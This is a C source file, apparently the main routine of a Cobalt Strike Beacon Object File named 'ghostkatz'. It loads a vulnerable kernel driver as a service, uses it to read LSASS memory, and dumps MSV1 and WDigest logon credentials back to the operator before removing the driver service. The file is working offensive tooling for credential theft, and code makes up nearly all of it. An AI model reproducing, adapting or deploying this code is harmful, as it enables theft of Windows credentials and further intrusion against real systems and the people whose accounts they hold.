#include <windows.h>

#include "beacon.h"
#include "defs.h"
#include "ioctl.h"
#include "provider.h"
#include "ghostkatz.h"


#include "provider.c"
#include "utils.c"
#include "privileges.c"
#include "superfetch.c"
#include "lsass.c"
#include "eprocess.c"
#include "lsass_getkeys.c"
#include "lsass_logonpasswords.c"
#include "lsass_wdigest.c"
#include "services.c"

formatp outputbuffer;

int go(char *args, int argLen)
{
    datap parser;
	BeaconDataParse(&parser, args, argLen);
    
    int prvFlagLen = 0;
    int modeLen = 0;
    char* prvFlag = BeaconDataExtract(&parser, &prvFlagLen);
    if (BeaconDataLength(&parser) < (int)sizeof(int))
    {
        BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
        return FALSE;
    }
    
    int provider = BeaconDataInt(&parser);
    char* mode = BeaconDataExtract(&parser, &modeLen);
    
    if (!mode || modeLen <= 0 || mode[0] == '\0')
    {
        BeaconPrintf(CALLBACK_ERROR, "Missing arguments!");
        return FALSE;
    }

    if (prvFlag && prvFlag[0] != '\0')
    {
        if (strcmp(prvFlag, "-prv") != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Invalid argument %s", prvFlag);
            return FALSE;
        }
    }

    if (BeaconDataLength(&parser) != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments!");
        return FALSE;
    }

    BOOL RetrieveMSV1Credentials = FALSE;
    BOOL RetrieveWDigestCredentials = FALSE;

    if (strcmp(mode, "logonpasswords") == 0)
    {
        RetrieveMSV1Credentials = TRUE;
    }
    if (strcmp(mode, "wdigest") == 0)
    {
        RetrieveWDigestCredentials = TRUE;
    }

    if (!RetrieveMSV1Credentials && !RetrieveWDigestCredentials)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
        return FALSE;
    }

    // We can create buffer now that the initial checks have passed
    BeaconFormatAlloc(&outputbuffer, 4096);

    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
    if (!bResult) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable privilege! Error code: %llx", GetLastError());
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");

    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
    if (prov_info == NULL)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    else
    {
        BeaconFormatPrintf(&outputbuffer, "[INFO] Provider: %s\n", prov_info->service_name);
    }


    // Get Windows Versions
    char WindowsVersion[32];
    if (!GetWinVersion(WindowsVersion, sizeof(WindowsVersion)))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);

    char* WindowsBuild = GetWinBuildNumber();
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);


    // Install service
    if (!isServiceInstalled(provider))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    // Get handle to driver
    HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");

        if (!removeService(provider))
        {
            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    // Create Superfetch Database
    if (!CreateGlobalSuperfetchDatabase())
    {
        if (!removeService(provider))
        {
            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
        }

        BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
        CloseHandle(hFile);

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials);


    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
    CloseHandle(hFile);
    
    // Stop and delete service
    if (!removeService(provider))
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
    BeaconFormatFree(&outputbuffer);
    
    return 0;
}
